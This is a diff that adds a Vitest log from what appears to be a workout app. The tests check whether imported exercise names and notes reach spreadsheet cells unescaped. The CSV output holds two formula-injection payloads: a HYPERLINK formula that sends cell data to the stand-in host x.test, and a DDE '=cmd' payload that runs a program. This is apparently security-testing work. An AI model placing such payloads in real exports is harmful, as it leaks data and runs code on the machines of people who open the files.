@@ -1,0 +1,19 @@
+
+[1m[30m[46m RUN [49m[39m[22m [36mv4.1.11 [39m[90m/work[39m
+
+[90mstdout[2m | src/lib/zz_x.test.ts[2m > [22m[2mx
+[22m[39mXLSX_CELL {"v":"=1+1","t":"s"} {"v":"@SUM(1)","t":"s"}
+
+ [32m✓[39m src/lib/zz_x.test.ts [2m([22m[2m1 test[22m[2m)[22m[32m 7[2mms[22m[39m
+[90mstdout[2m | src/lib/zz_csv.test.ts[2m > [22m[2mcsv formula[2m > [22m[2mimported note/exercise name reach CSV cell unescaped
+[22m[39mCSV_OUT
+date,exercise,phase,weight_lb,sets,reps,hold_s,set_detail,primary_muscles,secondary_muscles,note,program_slot,week_of
+2026-10-05,"=HYPERLINK(""http://x.test/?""&A2,""Squat"")",Strength,135,3,5,,,,,=cmd|' /C calc'!A0,,
+
+ [32m✓[39m src/lib/zz_csv.test.ts [2m([22m[2m1 test[22m[2m)[22m[32m 10[2mms[22m[39m
+
+[2m Test Files [22m [1m[32m2 passed[39m[22m[90m (2)[39m
+[2m      Tests [22m [1m[32m2 passed[39m[22m[90m (2)[39m
+[2m   Start at [22m 03:51:49
+[2m   Duration [22m 437ms[2m (transform 247ms, setup 0ms, import 345ms, tests 16ms, environment 0ms)[22m
+
